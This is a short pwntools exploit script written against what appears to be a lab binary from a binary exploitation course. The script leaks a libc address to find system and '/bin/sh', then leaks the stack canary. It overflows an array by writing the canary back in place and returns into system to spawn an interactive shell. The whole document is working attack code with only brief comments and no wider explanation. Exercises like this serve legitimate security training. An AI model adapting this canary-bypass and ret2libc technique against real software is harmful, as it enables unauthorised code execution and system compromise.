from pwn import *

system_offset = 0x2d193
bin_sh_offset = 0x14da27

p = process(["/levels/lab09/lab9C"])
log.info(util.proc.pidof(p))
pause()

# Leak a libc address to find "system"
p.sendline("2")
p.recv()
p.sendline("0")
p.recvuntil("] =")
leak = int(p.recvuntil("\n")) & 0xffffffff
system_addr = leak + system_offset
bin_sh_addr = leak + bin_sh_offset
log.info("Got leaked address at 0x{:x}".format(leak))
log.info("Found system at 0x{:x}".format(system_addr))
log.info("Found '/bin/sh' at 0x{:x}".format(bin_sh_addr))

# Leak the canary
p.sendline("2")
p.recv()
p.sendline("257")
p.recvuntil("] =")
canary = int(p.recvuntil("\n")) & 0xffffffff
log.info("Found canary 0x{:x}".format(canary))

pause()

# Overflow
for i in range(256):
    p.sendline("1")
    p.sendline(str(i))
    p.recv()

# Send canary
p.sendline("1")
p.sendline(str(canary))

# Extra junk
for i in range(3):
    p.sendline("1")
    p.sendline("0")

# Return to system
p.sendline("1")
p.sendline(str(system_addr))

# Junk RA
p.sendline("1")
p.sendline("0")

# Arg points to "/bin/sh"
p.sendline("1")
p.sendline(str(bin_sh_addr))

# Force a quit
p.sendline("3")

p.recv()
p.interactive()
